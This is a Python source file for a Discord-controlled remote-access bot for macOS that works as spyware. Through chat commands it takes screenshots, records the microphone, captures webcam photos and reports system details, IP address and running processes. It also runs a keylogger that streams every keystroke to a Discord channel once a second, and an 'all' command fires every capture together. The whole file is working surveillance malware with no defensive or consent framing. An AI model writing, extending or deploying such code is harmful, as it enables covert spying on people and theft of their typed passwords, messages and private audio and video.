import os
import discord
from discord.ext import commands
from dotenv import load_dotenv
import pyautogui
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np
from datetime import datetime
import asyncio
import psutil
import cv2
import platform
import socket
import time
import webbrowser
import subprocess
from pynput import keyboard
import threading
import json
import logging
from Quartz import (
    CGMainDisplayID,
    CGDisplayCreateImage,
    kCGNullWindowID,
    kCGWindowListOptionOnScreenOnly,
    CGWindowListCopyWindowInfo,
    kCGNullWindowID
)

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('discord')

# Load environment variables
load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='/bot ', intents=intents)

# Global variables for keylogger
keylogger_active = False
keylogger_data = []
keylogger_listener = None
keylogger_channel = None
last_send_time = 0

# Function Definitions
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
    screenshot.save(screenshot_path)
    return screenshot_path

def record_audio(duration=10, sample_rate=44100):
    recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
    sd.wait()
    audio_path = f'audio_{datetime.now().strftime("%Y%m%d_%H%M%S")}.wav'
    wav.write(audio_path, sample_rate, recording)
    return audio_path

def get_system_info():
    system_info = f"System: {platform.system()} {platform.release()}\n"
    system_info += f"Processor: {platform.processor()}\n"
    system_info += f"Python: {platform.python_version()}"
    return system_info

def get_ip_address():
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

def get_uptime():
    uptime = time.time() - psutil.boot_time()
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    return f"{hours}h {minutes}m {seconds}s"

def get_top_processes(limit=10):
    processes = []
    for proc in psutil.process_iter(['pid', 'name', 'cpu_percent']):
        try:
            processes.append(proc.info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
    return processes[:limit]

def take_webcam_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        photo_path = f'webcam_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'
        cv2.imwrite(photo_path, frame)
        cap.release()
        return photo_path
    cap.release()
    return None

def control_media(action):
    action = action.lower()
    if action == 'play':
        subprocess.run(['osascript', '-e', 'tell application "System Events" to key code 16'])
    elif action == 'next':
        subprocess.run(['osascript', '-e', 'tell application "System Events" to key code 17'])
    elif action == 'prev':
        subprocess.run(['osascript', '-e', 'tell application "System Events" to key code 18'])
    elif action == 'volumeup':
        subprocess.run(['osascript', '-e', 'tell application "System Events" to key code 72'])
    elif action == 'volumedown':
        subprocess.run(['osascript', '-e', 'tell application "System Events" to key code 73'])
    return action

def on_key_press(key):
    global last_send_time
    if keylogger_active:
        try:
            current_time = time.time()
            
            # Add the key to the buffer
            if key == keyboard.Key.space:
                keylogger_data.append('[SPACE]')
            elif key == keyboard.Key.enter:
                keylogger_data.append('[ENTER]\n')
            elif key == keyboard.Key.backspace:
                if keylogger_data:
                    keylogger_data.pop()
            elif key == keyboard.Key.tab:
                keylogger_data.append('[TAB]')
            elif hasattr(key, 'char'):
                keylogger_data.append(key.char)
            else:
                keylogger_data.append(f'[{str(key)}]')
            
            # If one second has passed since last send, send the data and reset
            if current_time - last_send_time >= 1.0:
                if keylogger_channel and keylogger_data:
                    asyncio.run_coroutine_threadsafe(
                        keylogger_channel.send(f"```{''.join(keylogger_data)}```"),
                        bot.loop
                    )
                    keylogger_data.clear()  # Reset the buffer
                    last_send_time = current_time
                
        except Exception as e:
            logger.error(f"Error in keylogger: {str(e)}")

# Bot Commands
@bot.event
async def on_ready():
    logger.info(f'Bot is ready! Logged in as {bot.user.name}')
    # Find the first available text channel to send the success message
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                await channel.send(f"The bot has initialized successfully and is now connected. Type `/bot help` to see available commands.")
                return  # Send message to first available channel and stop
            except discord.Forbidden:
                continue  # Try next channel if we don't have permission
            except Exception as e:
                logger.error(f"Error sending ready message: {str(e)}")
                continue

@bot.event
async def on_message(message):
    logger.info(f'Received message: {message.content} from {message.author}')
    if message.author == bot.user:
        return
    await bot.process_commands(message)

@bot.command(name='ss')
async def screenshot(ctx):
    try:
        screenshot_path = take_screenshot()
        await ctx.send("Screenshot taken", file=discord.File(screenshot_path))
    except Exception as e:
        logger.error(f"Error taking screenshot: {str(e)}")
        await ctx.send(f"Error taking screenshot: {str(e)}")

@bot.command(name='mic')
async def record(ctx):
    try:
        audio_path = record_audio()
        await ctx.send("Audio recorded", file=discord.File(audio_path))
    except Exception as e:
        logger.error(f"Error recording audio: {str(e)}")
        await ctx.send(f"Error recording audio: {str(e)}")

@bot.command(name='media')
async def media_control(ctx, action: str):
    try:
        action = control_media(action)
        await ctx.send(f"Media control: {action}")
    except Exception as e:
        logger.error(f"Error controlling media: {str(e)}")
        await ctx.send(f"Error controlling media: {str(e)}")

@bot.command(name='keylogger')
async def toggle_keylogger(ctx, action: str):
    global keylogger_active, keylogger_listener, keylogger_channel, last_send_time
    try:
        if action.lower() == 'start':
            if not keylogger_active:
                keylogger_active = True
                keylogger_data.clear()
                keylogger_channel = ctx.channel
                last_send_time = time.time()
                keylogger_listener = keyboard.Listener(on_press=on_key_press)
                keylogger_listener.start()
                await ctx.send("Keylogger started - sending keystrokes every second")
            else:
                await ctx.send("Keylogger is already running")
        elif action.lower() == 'stop':
            if keylogger_active:
                keylogger_active = False
                if keylogger_listener:
                    keylogger_listener.stop()
                    keylogger_listener = None
                # Send any remaining data before stopping
                if keylogger_channel and keylogger_data:
                    await ctx.send(f"```{''.join(keylogger_data)}```")
                keylogger_data.clear()
                keylogger_channel = None
                await ctx.send("Keylogger stopped")
            else:
                await ctx.send("Keylogger is not running")
        else:
            await ctx.send("Invalid action. Use 'start' or 'stop'")
    except Exception as e:
        logger.error(f"Error with keylogger: {str(e)}")
        await ctx.send(f"Error with keylogger: {str(e)}")

@bot.command(name='sysinfo')
async def system_info(ctx):
    try:
        info = get_system_info()
        await ctx.send(f"System Info:\n```{info}```")
    except Exception as e:
        logger.error(f"Error getting system info: {str(e)}")
        await ctx.send(f"Error getting system info: {str(e)}")

@bot.command(name='ip')
async def ip_address(ctx):
    try:
        ip = get_ip_address()
        await ctx.send(f"IP Address: {ip}")
    except Exception as e:
        logger.error(f"Error getting IP address: {str(e)}")
        await ctx.send(f"Error getting IP address: {str(e)}")

@bot.command(name='uptime')
async def uptime(ctx):
    try:
        uptime_str = get_uptime()
        await ctx.send(f"Uptime: {uptime_str}")
    except Exception as e:
        logger.error(f"Error getting uptime: {str(e)}")
        await ctx.send(f"Error getting uptime: {str(e)}")

@bot.command(name='processes')
async def processes(ctx):
    try:
        processes = get_top_processes()
        top_processes = "Top 10 processes by CPU usage:\n"
        for proc in processes:
            top_processes += f"{proc['name']}: {proc['cpu_percent']}%\n"
        await ctx.send(f"```{top_processes}```")
    except Exception as e:
        logger.error(f"Error getting processes: {str(e)}")
        await ctx.send(f"Error getting processes: {str(e)}")

@bot.command(name='camera')
async def camera(ctx):
    try:
        photo_path = take_webcam_photo()
        if photo_path:
            await ctx.send("Webcam photo taken", file=discord.File(photo_path))
        else:
            await ctx.send("Failed to capture webcam photo")
    except Exception as e:
        logger.error(f"Error capturing from camera: {str(e)}")
        await ctx.send(f"Error capturing from camera: {str(e)}")

@bot.command(name='all')
async def execute_all(ctx):
    try:
        results = []
        
        # Execute all functions
        screenshot_path = take_screenshot()
        await ctx.send("Screenshot taken", file=discord.File(screenshot_path))
        results.append("✓ Screenshot")
        
        audio_path = record_audio()
        await ctx.send("Audio recorded", file=discord.File(audio_path))
        results.append("✓ Audio recording")
        
        system_info = get_system_info()
        await ctx.send(f"System Info:\n```{system_info}```")
        results.append("✓ System info")
        
        ip = get_ip_address()
        await ctx.send(f"IP Address: {ip}")
        results.append("✓ IP address")
        
        uptime_str = get_uptime()
        await ctx.send(f"Uptime: {uptime_str}")
        results.append("✓ Uptime")
        
        processes = get_top_processes()
        top_processes = "Top 10 processes by CPU usage:\n"
        for proc in processes:
            top_processes += f"{proc['name']}: {proc['cpu_percent']}%\n"
        await ctx.send(f"```{top_processes}```")
        results.append("✓ Process list")
        
        photo_path = take_webcam_photo()
        if photo_path:
            await ctx.send("Webcam photo taken", file=discord.File(photo_path))
            results.append("✓ Webcam photo")
        
        summary = "All functions executed:\n" + "\n".join(results)
        await ctx.send(f"```{summary}```")
        
    except Exception as e:
        logger.error(f"Error in execute_all: {str(e)}")
        await ctx.send(f"Error executing all functions: {str(e)}")

# Run the bot
logger.info('Starting bot...')
bot.run(TOKEN) 